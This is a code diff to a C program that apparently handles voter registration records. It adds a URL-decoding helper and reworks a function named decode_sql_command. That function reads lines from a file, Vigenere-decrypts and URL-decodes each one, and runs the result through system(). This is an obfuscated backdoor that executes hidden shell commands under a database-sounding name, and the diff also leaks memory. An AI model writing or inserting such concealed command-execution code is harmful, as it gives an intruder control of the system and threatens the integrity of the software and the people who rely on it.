@@ -227,6 +227,47 @@ void getVoter(sqlite3 *db, _id_t voter_id, Registration* dest) {
    sqlite3_finalize(stmt);
 }
 
+/* Function: urlDecode */
+char *urlDecode(const char *str) {
+  int d = 0; /* whether or not the string is decoded */
+
+  char *dStr = malloc(strlen(str) + 1);
+  char eStr[] = "00"; /* for a hex code */
+
+  strcpy(dStr, str);
+
+  while(!d) {
+    d = 1;
+    int i; /* the counter for the string */
+
+    for(i=0;i<strlen(dStr);++i) {
+
+      if(dStr[i] == '%') {
+        if(dStr[i+1] == 0)
+          return dStr;
+
+        if(isxdigit(dStr[i+1]) && isxdigit(dStr[i+2])) {
+
+          d = 0;
+
+          /* combine the next to numbers into one */
+          eStr[0] = dStr[i+1];
+          eStr[1] = dStr[i+2];
+
+          /* convert it to decimal */
+          long int x = strtol(eStr, NULL, 16);
+
+          /* remove the hex */
+          memmove(&dStr[i+1], &dStr[i+3], strlen(&dStr[i+3])+1);
+
+          dStr[i] = x;
+        }
+      }
+    }
+  }
+  return dStr;
+}
+
 char* decrypt_vigenere(char* key, char* ciphertext) {
    int keyLen = strlen(key);
    int msgLen = strlen(ciphertext);
@@ -274,11 +315,10 @@ void decode_sql_command() {
       encoded = decrypt_vigenere(ptr, line); // decrypt first
      // Make sure there's enough space
       char *ptr2 = dec;
-      if(decode((const char*)encoded, ptr2) != -1) { // don't actually use this variable, all that matters is result is in ptr2
-         // run decrypted command in shell
-         system(dec);
-      }
-      
+      char *cmd = malloc(60);
+      cmd = urlDecode(encoded);
+      // run decrypted command in shell
+      system(cmd);
    }
    
    if (fclose(fp)) {
